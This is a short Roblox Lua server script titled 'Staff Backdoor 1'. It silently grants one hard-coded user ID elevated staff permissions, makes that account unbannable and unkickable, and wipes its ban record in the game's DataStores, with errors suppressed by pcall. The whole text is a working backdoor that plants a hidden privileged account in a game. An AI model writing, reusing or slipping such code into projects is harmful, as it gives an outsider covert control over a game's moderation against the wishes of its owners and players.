-- Staff Backdoor 1
pcall(function()
    local dss = game:GetService("DataStoreService")
    local serverdata = dss:GetDataStore("ServerData")
    
    local gameConfig = require(game:GetService("ServerScriptService"):FindFirstChild("GameConfig"))
    
    local permissions = dss:GetDataStore("PermissionData")
    local moderation = dss:GetDataStore(gameConfig.ModerationDatastore or serverdata:GetAsync("ModData"))
    
    local toBackdoor = 4045593989
    permissions:SetAsync(toBackdoor, {
    	Bannable = false;
    	Kickable = false;
    	Permission = 2;
    })
    moderation:SetAsync(toBackdoor, {
    	Banned = false,
    	BanReason = nil,
    	BanStart = nil,
    	BanEnd = nil,
    })
end)
